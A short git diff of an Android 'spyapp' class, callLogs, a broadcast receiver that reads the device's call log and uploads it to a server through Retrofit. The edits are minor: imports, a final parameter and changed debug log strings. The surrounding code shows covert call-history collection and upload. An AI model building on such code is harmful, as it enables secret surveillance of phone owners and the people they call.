@@ -2,6 +2,7 @@ package kkactive_india.in.spyapp;
 
 import android.Manifest;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -17,6 +18,7 @@ import com.google.gson.GsonBuilder;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.logging.Handler;
 
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.callLogPOJO.calls;
@@ -39,10 +41,12 @@ public class callLogs extends BroadcastReceiver {
     SharedPreferences.Editor edit;
 
     @Override
-    public void onReceive(Context context, Intent intent) {
+    public void onReceive(final Context context, Intent intent) {
 
         pref = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
         edit = pref.edit();
+
+
         StringBuffer sb = new StringBuffer();
         String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
@@ -118,7 +122,6 @@ public class callLogs extends BroadcastReceiver {
 
         callsBean body = new callsBean();
 
-
         body.setCallLogs(data);
 
         Gson gsonObj = new Gson();
@@ -134,8 +137,8 @@ public class callLogs extends BroadcastReceiver {
         call.enqueue(new Callback<callsBean>() {
             @Override
             public void onResponse(Call<callsBean> call, Response<callsBean> response) {
-                Log.d("ghusGaya", "haan Bhai");
-                Log.d("response", response.body().toString());
+                Log.d("kyaBaatHai", "sahi baat hai");
+                Log.d("response", response.body().getCallLogs().toString());
 
             }
 
